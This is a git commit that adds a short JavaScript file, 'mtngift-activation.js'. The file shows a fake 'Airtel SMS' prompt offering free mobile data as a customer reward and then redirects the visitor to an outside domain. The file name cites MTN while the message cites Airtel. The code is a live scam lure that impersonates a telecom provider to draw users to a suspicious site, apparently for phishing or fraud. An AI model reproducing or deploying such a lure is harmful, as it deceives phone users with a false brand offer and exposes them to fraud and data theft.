49bec51785e1a070d7939b476795e9efe279be90
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-05 20:46:58 -0700

    Create mtngift-activation.js

---
+++ mtngift-activation.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('Airtel SMS: Dear customer, kindly check if your Airtel sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/mofaya';
+}
